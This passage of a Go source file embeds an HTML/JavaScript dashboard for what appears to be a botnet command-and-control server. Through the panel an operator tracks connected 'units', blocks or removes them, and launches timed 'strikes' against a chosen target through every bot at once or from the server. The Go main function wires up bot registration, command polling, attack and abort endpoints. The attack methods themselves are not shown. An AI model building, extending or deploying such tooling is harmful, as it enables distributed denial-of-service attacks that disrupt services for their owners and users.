        let startTime = Date.now();

        setInterval(() => {
            const seconds = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = seconds % 60;
            document.getElementById('uptime').textContent = 
                hours > 0 ? ` + "`" + `${hours}h ${minutes}m` + "`" + ` : ` + "`" + `${minutes}m ${secs}s` + "`" + `;
        }, 1000);

        setInterval(() => {
            refreshBots();
            refreshBlockedBots();
        }, 5000);

        function updateStats() {
            document.getElementById('botCount').textContent = bots.length;
            document.getElementById('totalBots').textContent = bots.length;
            document.getElementById('totalAttacks').textContent = totalAttacks;
            document.getElementById('activeAttacks').textContent = activeAttacks;
        }

        function renderBlockedBots() {
            const blockedList = document.getElementById('blockedList');
            if (blockedBots.length === 0) {
                blockedList.innerHTML = '<p class="text-red-400/50 text-center py-8 text-sm">NO BLOCKED UNITS</p>';
                return;
            }

            blockedList.innerHTML = blockedBots.map((botUrl) => ` + "`" + `
                <div class="bg-red-500/10 p-4 rounded-lg border border-red-500/30 flex items-center justify-between hover:border-red-500/60 transition-all">
                    <div class="flex items-center gap-3">
                        <div class="w-2 h-2 bg-red-500 rounded-full"></div>
                        <div class="text-red-400 font-mono text-sm">${botUrl}</div>
                    </div>
                    <button onclick="unblockBot('${botUrl}')" 
                        class="text-green-400 hover:text-green-300 text-xs px-3 py-1 bg-green-500/20 rounded border border-green-500/50 orbitron transition-all">
                        UNBLOCK
                    </button>
                </div>
            ` + "`" + `).join('');
        }

        function renderBots() {
            const botsList = document.getElementById('botsList');
            if (bots.length === 0) {
                botsList.innerHTML = '<p class="text-cyan-400/50 text-center py-16 text-lg">⚡ AWAITING UNIT CONNECTION...</p>';
                return;
            }

            const now = Date.now();

            botsList.innerHTML = bots.map((bot, index) => {
                const timeSinceLastSeen = now - (bot.lastSeen || now);
                const isOnline = timeSinceLastSeen < 60000;
                const statusColor = isOnline ? 'bg-green-500' : 'bg-red-500';
                const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
                const statusTextColor = isOnline ? 'text-green-400' : 'text-red-400';
                
                return ` + "`" + `
                <div class="bg-cyan-500/5 p-4 rounded-lg border border-cyan-500/20 hover:border-cyan-500/40 transition-all">
                    <div class="flex items-center justify-between">
                        <div class="flex items-center gap-4 flex-1">
                            <div class="w-3 h-3 ${statusColor} rounded-full ${isOnline ? 'pulse-ring' : ''}"></div>
                            <div class="flex-1">
                                <div class="text-cyan-400 font-mono text-sm mb-1">${bot.url}</div>
                                <div class="text-xs text-cyan-400/50 orbitron">
                                    UNIT #${index + 1} | <span class="${statusTextColor}">${statusText}</span> | ${bot.time}
                                </div>
                            </div>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="removeBot(${index})" 
                                class="text-yellow-400 hover:text-yellow-300 text-xs px-3 py-1 bg-yellow-500/20 rounded border border-yellow-500/50 orbitron transition-all">
                                REMOVE
                            </button>
                            <button onclick="blockBot(${index})" 
                                class="text-red-400 hover:text-red-300 text-xs px-3 py-1 bg-red-500/20 rounded border border-red-500/50 orbitron transition-all">
                                BLOCK
                            </button>
                        </div>
                    </div>
                </div>
            ` + "`" + `;
            }).join('');
        }

        function removeBot(index) {
            const bot = bots[index];
            bots.splice(index, 1);
            renderBots();
            updateStats();
            addLog(` + "`" + `Unit removed (temporary): ${bot.url}` + "`" + `, 'info');
        }

        async function blockBot(index) {
            const bot = bots[index];
            
            if (!confirm(` + "`" + `Permanently block this unit?\n\n${bot.url}\n\nThe unit will not be able to reconnect.` + "`" + `)) {
                return;
            }

            try {
                const response = await fetch(` + "`" + `/block-bot?bot=${encodeURIComponent(bot.url)}` + "`" + `);
                const data = await response.json();
                
                if (data.success) {
                    bots.splice(index, 1);
                    renderBots();
                    updateStats();
                    refreshBlockedBots();
                    addLog(` + "`" + `Unit permanently blocked: ${bot.url}` + "`" + `, 'success');
                } else {
                    addLog(` + "`" + `Failed to block unit: ${data.error}` + "`" + `, 'error');
                }
            } catch (error) {
                addLog(` + "`" + `Error blocking unit: ${error.message}` + "`" + `, 'error');
            }
        }

        async function unblockBot(botUrl) {
            if (!confirm(` + "`" + `Unblock this unit?\n\n${botUrl}\n\nThe unit will be able to reconnect.` + "`" + `)) {
                return;
            }

            try {
                const response = await fetch(` + "`" + `/unblock-bot?bot=${encodeURIComponent(botUrl)}` + "`" + `);
                const data = await response.json();
                
                if (data.success) {
                    refreshBlockedBots();
                    addLog(` + "`" + `Unit unblocked: ${botUrl}` + "`" + `, 'success');
                } else {
                    addLog(` + "`" + `Failed to unblock unit: ${data.error}` + "`" + `, 'error');
                }
            } catch (error) {
                addLog(` + "`" + `Error unblocking unit: ${error.message}` + "`" + `, 'error');
            }
        }

        function removeAllBots() {
            if (confirm('Remove all units?')) {
                bots = [];
                renderBots();
                updateStats();
                addLog('All units removed', 'info');
            }
        }

        async function refreshBots() {
            try {
                const response = await fetch('/bots');
                const data = await response.json();
                bots = data.bots;
                renderBots();
                updateStats();
            } catch (error) {
                console.error('Failed to refresh units:', error);
            }
        }

        async function refreshBlockedBots() {
            try {
                const response = await fetch('/blocked');
                const data = await response.json();
                blockedBots = data.blocked;
                renderBlockedBots();
            } catch (error) {
                console.error('Failed to refresh blocked units:', error);
            }
        }

        async function attackAll() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if (!target || !time) {
                addLog('Error: Target and time required', 'error');
                return;
            }

            if (bots.length === 0) {
                addLog('Error: No units connected', 'error');
                return;
            }

            const btn = document.getElementById('attackBtn');
            btn.disabled = true;
            btn.textContent = '⚡ LAUNCHING...';
            
            activeAttacks++;
            totalAttacks++;
            updateStats();

            addLog(` + "`" + `Launching ${method} to ${bots.length} units` + "`" + `, 'info');
            addLog(` + "`" + `Target: ${target} | Duration: ${time}s` + "`" + `, 'info');

            let successCount = 0;
            let failCount = 0;

            for (const bot of bots) {
                try {
                    const response = await fetch(` + "`" + `/attack-bot?bot=${encodeURIComponent(bot.url)}&target=${encodeURIComponent(target)}&time=${time}&methods=${method}` + "`" + `);
                    const data = await response.json();
                    
                    if (data.success) {
                        successCount++;
                        addLog(` + "`" + `${bot.url} - Strike launched` + "`" + `, 'success');
                    } else {
                        failCount++;
                        addLog(` + "`" + `${bot.url} - Failed` + "`" + `, 'error');
                    }
                } catch (error) {
                    failCount++;
                    addLog(` + "`" + `${bot.url} - Network error` + "`" + `, 'error');
                }
            }

            addLog(` + "`" + `Strike complete: ${successCount} success, ${failCount} failed` + "`" + `, 'info');

            setTimeout(() => {
                activeAttacks = Math.max(0, activeAttacks - 1);
                updateStats();
            }, parseInt(time) * 1000);

            btn.disabled = false;
            btn.textContent = '⚔️ LAUNCH STRIKE';
        }

        async function stopAll() {
            const btn = document.getElementById('stopBtn');
            btn.disabled = true;
            btn.textContent = '⏸️ ABORTING...';

            addLog('Sending abort command to all units', 'info');

            try {
                const response = await fetch('/stop-all');
                const data = await response.json();
                
                if (data.success) {
                    addLog(` + "`" + `Abort command sent: ${data.message}` + "`" + `, 'success');
                    activeAttacks = 0;
                    updateStats();
                } else {
                    addLog('Failed to send abort command', 'error');
                }
            } catch (error) {
                addLog(` + "`" + `Error: ${error.message}` + "`" + `, 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = '🛑 ABORT ALL';
            }
        }

        async function attackServer() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if (!target || !time) {
                addLog('Error: Target and time required', 'error');
                return;
            }

            const btn = document.getElementById('serverBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = '⚡ EXECUTING...';
            
            activeAttacks++;
            totalAttacks++;
            updateStats();

            addLog(` + "`" + `Server executing ${method} strike on ${target}` + "`" + `, 'info');

            try {
                const response = await fetch(` + "`" + `/attack?target=${encodeURIComponent(target)}&time=${time}&methods=${method}` + "`" + `);
                const data = await response.json();
                
                if (response.ok) {
                    addLog(` + "`" + `Server strike launched!` + "`" + `, 'success');
                    status.classList.remove('hidden');
                    status.querySelector('p').innerHTML = ` + "`" + `
                        <strong class="text-red-400">SERVER ACTIVE:</strong> 
                        <span class="text-cyan-400">${target}</span> | 
                        <span class="text-yellow-400">${method}</span> | 
                        <span class="text-green-400">${time}s</span>
                    ` + "`" + `;
                    
                    setTimeout(() => {
                        activeAttacks = Math.max(0, activeAttacks - 1);
                        updateStats();
                    }, parseInt(time) * 1000);
                } else {
                    addLog(` + "`" + `Error: Server strike failed` + "`" + `, 'error');
                    activeAttacks = Math.max(0, activeAttacks - 1);
                    updateStats();
                }
            } catch (error) {
                addLog(` + "`" + `Network Error: ${error.message}` + "`" + `, 'error');
                activeAttacks = Math.max(0, activeAttacks - 1);
                updateStats();
            } finally {
                btn.disabled = false;
                btn.textContent = '💻 SERVER ATTACK';
            }
        }

        function addLog(message, type = 'info') {
            const logsDiv = document.getElementById('logs');
            const timestamp = new Date().toLocaleTimeString();
            const icons = { info: '📡', success: '✅', error: '❌' };
            const colors = { info: 'text-cyan-400', success: 'text-green-400', error: 'text-red-400' };
            
            if (logsDiv.querySelector('.text-cyan-400\\/50')) {
                logsDiv.innerHTML = '';
            }
            
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry mb-3 pb-3 border-b border-cyan-500/20 pl-3';
            logEntry.innerHTML = ` + "`" + `
                <div class="flex items-start gap-3">
                    <span class="${colors[type]} text-lg">${icons[type]}</span>
                    <div class="flex-1">
                        <span class="text-cyan-400/50 text-xs orbitron">[${timestamp}]</span>
                        <span class="${colors[type]} ml-2">${message}</span>
                    </div>
                </div>
            ` + "`" + `;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function clearLogs() {
            document.getElementById('logs').innerHTML = '<p class="text-cyan-400/50 text-center py-16">⚡ SYSTEM READY - NO ACTIVITY</p>';
        }

        refreshBots();
        refreshBlockedBots();
    </script>
</body>
</html>`

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "5553"
	}

	server := NewServer()

	http.HandleFunc("/", server.home)
	http.HandleFunc("/register", server.registerBot)
	http.HandleFunc("/get-command", server.getCommand)
	http.HandleFunc("/bots", server.getBots)
	http.HandleFunc("/ping", server.ping)
	http.HandleFunc("/attack-bot", server.attackBot)
	http.HandleFunc("/stop-bot", server.stopBot)
	http.HandleFunc("/stop-all", server.stopAll)
	http.HandleFunc("/block-bot", server.blockBot)
	http.HandleFunc("/unblock-bot", server.unblockBot)
	http.HandleFunc("/blocked", server.getBlocked)
	http.HandleFunc("/attack", server.attack)

	log.Println("========================================")
	log.Println("⚡ CYBER OPS COMMAND CENTER ONLINE")
	log.Println("========================================")
	log.Printf("Local:    http://localhost:%s\n", port)
	log.Println("========================================")

	if err := http.ListenAndServe(":"+port, nil); err != nil {
		log.Fatal(err)
	}
}
